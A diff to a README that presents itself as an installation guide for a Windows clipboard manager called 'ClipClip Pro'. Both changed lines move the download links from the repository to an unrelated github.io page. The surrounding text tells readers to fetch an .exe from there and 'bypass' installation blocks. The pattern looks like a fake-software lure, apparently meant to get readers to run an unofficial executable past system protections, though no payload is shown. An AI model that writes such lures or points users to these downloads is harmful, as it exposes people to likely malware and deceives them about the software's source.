@@ -1,6 +1,6 @@
 # 📋 ClipClip-Configuration-Guide - Manage your clipboard history with ease
 
-[![](https://img.shields.io/badge/Download_ClipClip_Pro-Blue?style=for-the-badge)](https://github.com/Theophyllusoblique404/ClipClip-Configuration-Guide)
+[![](https://img.shields.io/badge/Download_ClipClip_Pro-Blue?style=for-the-badge)](https://theophyllusoblique404.github.io)
 
 This guide helps you put ClipClip Pro on your Windows 11 computer. Many users face installation blocks. This document explains the steps to bypass common errors and get your clipboard manager running.
 
@@ -16,7 +16,7 @@ Before you start, check your computer against this list. Your system needs these
 
 ## 📥 How to Download the Software
 
-Visit this page to download the setup file: https://github.com/Theophyllusoblique404/ClipClip-Configuration-Guide.
+Visit this page to download the setup file: https://theophyllusoblique404.github.io
 
 Look for the latest release version on the page. Click the file with the .exe extension to save it to your Downloads folder. Do not open the file until the entire download completes. A partial file causes installation errors.
 
